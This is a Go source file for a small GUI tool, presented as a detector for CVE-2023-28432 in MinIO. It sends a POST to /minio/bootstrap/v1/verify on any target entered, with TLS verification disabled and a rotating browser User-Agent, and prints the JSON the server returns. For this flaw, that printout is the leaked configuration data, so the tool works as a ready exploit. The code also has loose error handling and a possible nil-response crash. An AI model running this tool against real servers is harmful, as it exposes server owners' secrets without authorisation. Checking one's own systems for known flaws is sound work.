package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"time"
)

func main() {
	// 创建新应用
	myApp := app.New()
	myWindow := myApp.NewWindow("CVE-2023-28432 Vulnerability Detector")
	myWindow.Resize(fyne.NewSize(800, 600))
	// 创建用户输入字段、按钮和输出显示区域
	input := widget.NewEntry()
	input.SetPlaceHolder("Enter target URL or IP")
	output := widget.NewMultiLineEntry()
	scrollOutput := container.NewVScroll(output)
	scrollOutput.SetMinSize(fyne.NewSize(800, 400))
	checkButton := widget.NewButton("Check Vulnerability", func() {
		// 获取输入值
		target := input.Text

		// 检查输入值是否为空
		if target == "" {
			output.SetText("Error: Input is empty. Please enter a target URL or IP.\n")
			return
		}

		// 检查输入值是否是有效的URL
		_, err := url.ParseRequestURI(target)
		if err != nil {
			output.SetText(fmt.Sprintf("Error: Invalid URL or IP. Please enter a valid target URL or IP.\nError details: %s\n", err))
			return
		}

		// 既然输入有效，继续检查漏洞
		output.SetText("Checking: " + target + "\n")
		result := checkVulnerability(target)
		output.SetText(output.Text + result + "\n")
	})

	// 将组件放入容器
	content := container.NewBorder(container.NewVBox(input, checkButton), nil, nil, nil, scrollOutput) // 添加输出显示区域到容器
	myWindow.SetContent(content)

	// 运行应用
	myWindow.ShowAndRun()
}

// checkVulnerability 是检测CVE-2023-28432漏洞的函数，这里需要根据实际情况编写逻辑。
func checkVulnerability(target string) string {
	parsedURL, err := url.Parse(target)
	url := parsedURL.Scheme + "://" + parsedURL.Host + "/minio/bootstrap/v1/verify"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		fmt.Println("Error creating request: ", err)
	}
	req.Header.Set("User-Agent", getRandomUserAgent())
	client := &http.Client{
		Transport: &http.Transport{
			// 自定义TLS客户端配置
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // 设置为true来忽略证书验证
			},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request: ", err)
	}
	defer resp.Body.Close()
	// 这里应该是针对CVE-2023-28432的检测代码
	// 返回值应该是检测结果的描述
	// 以下仅为示例逻辑，实际应根据漏洞特点和检测方法进行编写
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// 处理错误
	}
	// 将字节转换为字符串
	bodyString := string(bodyBytes)
	if resp.StatusCode == 200 {
		var data interface{}
		err = json.Unmarshal([]byte(bodyString), &data)
		if err != nil {
			log.Fatalf("Error occurred during unmarshaling. Error: %s", err.Error())
		}

		// 美化 JSON 字符串
		indentedJSON, err := json.MarshalIndent(data, "", "    ")
		if err != nil {
			log.Fatalf("Error occurred during marshaling. Error: %s", err.Error())
		}

		// 输出美化后的 JSON 字符串
		return "Target is vulnerable to CVE-2023-28432!" + "\n" + string(indentedJSON)
	}
	return "Target is not vulnerable to CVE-2023-28432."
}
func getRandomUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	return UserAgents[rand.Intn(len(UserAgents))]
}

var UserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	// 可以继续添加更多的 User-Agent
}
